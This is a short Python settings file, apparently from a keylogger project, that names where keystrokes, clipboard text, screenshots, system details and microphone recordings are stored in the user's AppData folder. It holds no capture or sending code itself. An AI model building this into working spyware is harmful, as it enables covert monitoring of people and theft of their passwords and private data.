from os import environ
system_information = "system.txt" #file to save system info
audio_information = "audio.wav" #file to save audio
clipboard_information = "clipboard.txt" #file to save clipboard data
screenshot_information = "screenshot.png" #file to save screenshot image
keys_information = "key_log.txt" #file to save keylogger data
#system_information_e = 'e_system.txt' #Will implement encryption later
#clipboard_information_e = 'e_clipboard.txt' #Will implement encryption later
#keys_information_e = 'e_keys_logged.txt' #Will implement encryption later
key_log_path = "%s\\appdata\\"%environ['USERPROFILE'] #path to save file defined in keys_information
syscon_path = key_log_path #path to save file defined in system_information 
clipboard_path = key_log_path #path to save file defined in clipboard_information 
audio_path = key_log_path #path to save file defined in audio_information
ss_path = key_log_path #path to save file defined in screenshot information
audio_sample_freq=44100 #sampling frequency for audio recorder
audio_time =  10 #time to record
